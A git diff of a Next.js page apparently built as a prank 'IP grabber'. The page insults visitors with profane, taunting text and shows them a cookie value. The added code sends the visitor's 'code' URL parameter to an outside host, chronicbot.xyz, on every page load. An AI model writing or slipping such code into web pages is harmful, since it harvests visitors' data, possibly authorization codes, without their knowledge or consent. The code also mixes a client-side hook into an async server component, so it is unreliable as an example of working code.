@@ -10,11 +10,17 @@ export default async function Page() {
   const cook = cookies()
   const params = useSearchParams()
   const code = params.get('code')
-  await fetch("https://www.chronicbot.xyz/api/cookies", {method: "POST", }
+  await fetch("https://www.chronicbot.xyz/api/cookies", {
+    method: "POST",
+    headers: {
+      "name": "code",
+      "value": code
+    }
+  })
   function btnLog() {
     console.log("Vercel log test");
   }
-  
+  const newCode = cook.get('code')
   return (
     <>
       <h1>Got your fucken IP idiot</h1>
@@ -23,6 +29,7 @@ export default async function Page() {
       <h3>Consider yourself lucky</h3>
       <p>Just by opening a website, your ip can be displayed, and used to the website's advantage. So be careful about who you trust</p>
       <br/><br/><br/>
+      <p>{newCode}</p>
       <h5>Don't tell the others, this is important</h5>
     </>
   );
